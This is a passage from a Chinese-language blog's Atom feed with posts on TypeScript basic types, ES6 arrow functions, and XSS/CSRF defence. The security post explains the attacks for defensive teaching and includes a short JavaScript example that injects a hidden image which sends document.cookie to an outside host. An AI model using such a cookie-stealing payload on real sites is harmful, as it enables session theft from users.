success</span></span><br></pre></td></tr></table></figure><h4 id="永远不存在的值-never"><a href="#永远不存在的值-never" class="headerlink" title="永远不存在的值(never)"></a>永远不存在的值(never)</h4><p>例如， never类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型；<br><strong>never类型是任何类型的子类型，也可以赋值给任何类型；然而，没有类型是never的子类型或可以赋值给never类型（除了never本身之外）。 即使 any也不可以赋值给never。</strong></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> n: never; <span class="comment">// never 不能被赋值</span></span><br><span class="line"><span class="keyword">let</span> num: <span class="built_in">number</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">let</span> a: <span class="built_in">any</span>;</span><br><span class="line"></span><br><span class="line">num = n; <span class="comment">// success，never类型是任何类型的子类型</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">123</span>; <span class="comment">// error</span></span><br><span class="line">n = a; <span class="comment">// error</span></span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 返回never的函数必须存在无法达到的终点</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">error</span>(<span class="params">message: <span class="built_in">string</span></span>): <span class="title">never</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="类型断言"><a href="#类型断言" class="headerlink" title="类型断言"></a>类型断言</h4><p>有时候你会遇到这样的情况，你会比TypeScript更了解某个值的详细信息。 通常这会发生在你清楚地知道一个实体具有比它现有类型更确切的类型。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> str: <span class="built_in">any</span> = <span class="string">"this is a string"</span>;</span><br><span class="line"><span class="keyword">let</span> strLength1: <span class="built_in">number</span>;</span><br><span class="line"><span class="keyword">let</span> strLength2: <span class="built_in">number</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 as 断言语法</span></span><br><span class="line">strLength1 = (str <span class="keyword">as</span> <span class="built_in">string</span>).length;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 &lt;&gt; 断言语法</span></span><br><span class="line">strLength2 = (&lt;<span class="built_in">string</span>&gt;str).length;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 上面这两种断言方式得到的效果完全一致，下面增加的内容是因为模版出了点bug</span></span><br><span class="line"><span class="comment">// 对于语法的解析已经不是js的语法了，不填充以下内容，整块js都无法展示</span></span><br><span class="line">strLength1 === strLength2; <span class="comment">// -&gt; true</span></span><br><span class="line">strLength1 === strLength2; <span class="comment">// -&gt; true</span></span><br><span class="line">strLength1 === strLength2; <span class="comment">// -&gt; true</span></span><br><span class="line">strLength1 === strLength2; <span class="comment">// -&gt; true</span></span><br><span class="line">strLength1 === strLength2; <span class="comment">// -&gt; true</span></span><br><span class="line">strLength1 === strLength2; <span class="comment">// -&gt; true</span></span><br><span class="line">strLength1 === strLength2; <span class="comment">// -&gt; true</span></span><br></pre></td></tr></table></figure><p>以上是 <code>typescript</code> 所有的基础类型。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;javascript&lt;/code&gt; 是运行在浏览器中的一门脚本语言，为了尽可能的减少内存的开支所以在设计之初它就是一门 &lt;code&gt;弱类型&lt;/code&gt; 的语言。这在开发小而简单的应用时是可以为我们带来性能的提升，但是随着项目的扩大 &lt;code&gt;状态&lt;/code&gt; 变的难以追踪将会引发很多的 &lt;code&gt;bug&lt;/code&gt; 出现。&lt;br&gt;例子：&lt;br&gt;&lt;figure class=&quot;highlight ts&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; test;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt; test;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// -&amp;gt; &#39;undefined&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;test = &lt;span class=&quot;string&quot;&gt;&#39;str&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt; test;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// -&amp;gt; &#39;string&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;test = &lt;span class=&quot;number&quot;&gt;123&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt; test;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// -&amp;gt; &#39;number&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XSS和CSRF防御</title>
    <link href="https://github.com/TheNightElf/2016/12/13/XSS%E5%92%8CCSRF%E9%98%B2%E5%BE%A1/"/>
    <id>https://github.com/TheNightElf/2016/12/13/XSS和CSRF防御/</id>
    <published>2016-12-13T06:02:51.000Z</published>
    <updated>2018-01-23T09:38:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>XSS和CSRF(XSRF)都属于跨站攻击，XSS是实现CSRF(XSRF)诸多途径中的一条，但不是唯一一条。</p><a id="more"></a><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>XSS的本质是让对方浏览器执行你插入的js ，来获取<code>cookie</code>等信息；<br>CSRF(XSRF)是借用用户的身份，向服务器发送请求。</p><h3 id="XSS的类型"><a href="#XSS的类型" class="headerlink" title="XSS的类型"></a>XSS的类型</h3><h5 id="储存型"><a href="#储存型" class="headerlink" title="储存型"></a>储存型</h5><p>储存型的XSS代码是储存在服务器端，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃 <code>cookie</code> 等。</p><h5 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h5><p>反射型XSS需要欺骗用户自己去点击链接才能触发XSS代码。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS。</p><p><strong>Example:</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">img.src = <span class="string">'http://www.xss.com?cookie='</span> + <span class="built_in">document</span>.cookie;</span><br><span class="line">img.style.display = <span class="string">'none'</span>;</span><br><span class="line"><span class="built_in">document</span>.getElementByTagName(<span class="string">'body'</span>)[<span class="number">0</span>].appendChild(img);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这样就能在用户不知道的情况下将用户在该网站的 `cookie` 信息以 `get` 请求的方式发送给另一个地址。</span></span><br></pre></td></tr></table></figure><h3 id="XSS的防范"><a href="#XSS的防范" class="headerlink" title="XSS的防范"></a>XSS的防范</h3><p>客户端校验用户输入信息，只允许输入合法的值，其他一概过滤掉，防止客户端输入恶意的js代码被植入到HTML代码中，使得js代码得以执行。</p><p><strong>Example:</strong></p><ul><li>移除用户上传的DOM属性，如 <code>onerror</code> 等。</li><li>移除用户上传的 <code>style</code>节点，<code>script</code>节点，<code>iframe</code>节点等。</li><li>对用户输入的代码标签进行转换(html encode)。</li><li>对url中的参数进行过滤。</li><li>对动态输出到页面的内容进行HTML编码。</li><li>服务端对敏感的 <code>Cookie</code> 设置 <code>httpOnly</code> 属性，使js脚本不能读取到 <code>cookie</code>。</li></ul><p><strong>题外话：</strong><br>目前很多浏览器都会自身对用户的输入进行判断，检测是否存在攻击字符，比如你上述提到的 <code>script</code> 标签，这段脚本很明显就是一段XSS攻击，因此浏览器会对这段输入进行处理，不同的浏览器处理方式也不一样。</p><h3 id="CSRF-XSRF-的过程"><a href="#CSRF-XSRF-的过程" class="headerlink" title="CSRF(XSRF)的过程"></a>CSRF(XSRF)的过程</h3><p><strong>Example:</strong></p><ul><li>用户小明在你的网站A上面登录了，A返回了一个 <code>session ID</code> (使用cookie存储)。</li><li>小明的浏览器保持着A网站的登录状态，攻击者小强给小明发送了一个链接地址。</li><li>小明打开了地址的时候，这个页面已经自动的对网站a发送了一个请求。</li><li>通过使用小明的cookie信息，这样攻击者小强就可以随意更改小明在A上的信息。</li></ul><h3 id="CSRF-XSRF-的防范"><a href="#CSRF-XSRF-的防范" class="headerlink" title="CSRF(XSRF)的防范"></a>CSRF(XSRF)的防范</h3><ul><li><p><strong>使用token：</strong> 服务器随机产生 <code>tooken</code>，然后以 <code>tooken为秘钥产生一段密文</code>，把 <code>token和密文</code> 都随 <code>cookie</code> 交给前端，前端发起请求时把 <code>密文和token</code> 交给后端看 <code>token</code> 能不能生成同样的密文，这样即使黑客拿到了 <code>token</code> 也无法拿到密文。</p></li><li><p><strong>使用验证码：</strong> 每一个重要的 <code>post</code> 提交页面，使用一个验证码，因为第三方网站是无法获得验证码的。</p></li><li><p><strong>检测http的头信息refer：</strong> <code>Referer</code> 记录了请求的来源地址，服务器可以验证这个来源地址是否合法。</p></li><li><p><strong>更改请求方式：</strong> 涉及敏感操作的请求改为 <code>POST</code> 请求。</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;XSS和CSRF(XSRF)都属于跨站攻击，XSS是实现CSRF(XSRF)诸多途径中的一条，但不是唯一一条。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>箭头函数</title>
    <link href="https://github.com/TheNightElf/2016/12/03/%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0/"/>
    <id>https://github.com/TheNightElf/2016/12/03/箭头函数/</id>
    <published>2016-12-03T07:55:59.000Z</published>
    <updated>2018-01-23T09:37:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>熟悉后端的人对于箭头函数应该不会陌生，在 <code>C#</code> 中它叫做 <code>Lambda表达式</code>，其他的后端语言中也一直都有他的身影。<br>箭头函数是ES6新加入的一个重要特性，它简洁明了的书写方式大大的简化了我们平时代码。下面我们看一下箭头函数的特性。<br><a id="more"></a></p><h3 id="箭头函数的特性"><a href="#箭头函数的特性" class="headerlink" title="箭头函数的特性"></a>箭头函数的特性</h3><ul><li>自动返回</li><li>不会绑定自己的 <code>this</code></li><li>书写更加方便</li><li>不会绑定 <code>arguments</code></li><li>无法使用 <code>prototype</code></li><li>无法使用 <code>new</code> 关键字</li><li>在创建是初始化 <code>this</code> 而非调用时指定</li></ul><h3 id="自动返回"><a href="#自动返回" class="headerlink" title="自动返回"></a>自动返回</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写法一</span></span><br><span class="line"><span class="keyword">var</span> fn = <span class="function"><span class="params">a</span> =&gt;</span> a + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法二</span></span><br><span class="line"><span class="keyword">var</span> fn2 = <span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法三</span></span><br><span class="line"><span class="keyword">var</span> fn3 = <span class="function">(<span class="params">a, b</span>) =&gt;</span> (a + b)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法四</span></span><br><span class="line"><span class="keyword">var</span> fn4 = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当 <code>参数</code> 只有一个的时候，可以省略参数外面的 <code>()</code>;<br>当函数的表达式只有一句时，可以直接书写在 <code>=&gt;</code> 后面，表示返回该表达式；也可以在表达式外加上一对 <code>()</code>返回，一般用于返回 <code>字面量</code> 和 <code>提升优先级</code>。<br>如果逻辑处理过长，则使用 <code>写法四</code> 书写，该写法不会自动返回，需手动指定返回内容。</p><h3 id="不会绑定自己的-this"><a href="#不会绑定自己的-this" class="headerlink" title="不会绑定自己的 this"></a>不会绑定自己的 <code>this</code></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.onclick = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="keyword">this</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// this =&gt; window</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.body.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this =&gt; body</span></span><br></pre></td></tr></table></figure><h3 id="不会绑定-arguments"><a href="#不会绑定-arguments" class="headerlink" title="不会绑定 arguments"></a>不会绑定 <code>arguments</code></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="built_in">arguments</span> = <span class="string">'arguments'</span>;</span><br><span class="line"><span class="keyword">var</span> fn = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="built_in">arguments</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// arguments =&gt; 'arguments'</span></span><br></pre></td></tr></table></figure><h3 id="无法使用-prototype"><a href="#无法使用-prototype" class="headerlink" title="无法使用 prototype"></a>无法使用 <code>prototype</code></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fn = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'fn'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(fn.prototype)</span><br><span class="line"><span class="comment">// fn.prototype =&gt; undefined</span></span><br><span class="line"><span class="comment">// 箭头函数没有 prototype 原型链</span></span><br></pre></td></tr></table></figure><h3 id="无法使用-new-关键字"><a href="#无法使用-new-关键字" class="headerlink" title="无法使用 new 关键字"></a>无法使用 <code>new</code> 关键字</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> fn = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'fn'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> fn()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Uncaught TypeError: fn is not a constructor</span></span><br><span class="line"><span class="comment">// 函数 fn 不是一个构造器</span></span><br></pre></td></tr></table></figure><p>以上就是箭头函数的所有特性了。</p><h3 id="在创建是初始化-this-而非调用时指定"><a href="#在创建是初始化-this-而非调用时指定" class="headerlink" title="在创建是初始化 this 而非调用时指定"></a>在创建是初始化 <code>this</code> 而非调用时指定</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 非箭头函数</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    fn: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="keyword">this</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f = obj.fn();</span><br><span class="line"><span class="keyword">var</span> res = f(); <span class="comment">// -&gt; window</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 箭头函数</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    fn: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="keyword">this</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f = obj.fn();</span><br><span class="line"><span class="keyword">var</span> res = f(); <span class="comment">// -&gt; obj</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;熟悉后端的人对于箭头函数应该不会陌生，在 &lt;code&gt;C#&lt;/code&gt; 中它叫做 &lt;code&gt;Lambda表达式&lt;/code&gt;，其他的后端语言中也一直都有他的身影。&lt;br&gt;箭头函数是ES6新加入的一个重要特性，它简洁明了的书写方式大大的简化了我们平时代码。下面我们看一下箭头函数的特性。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
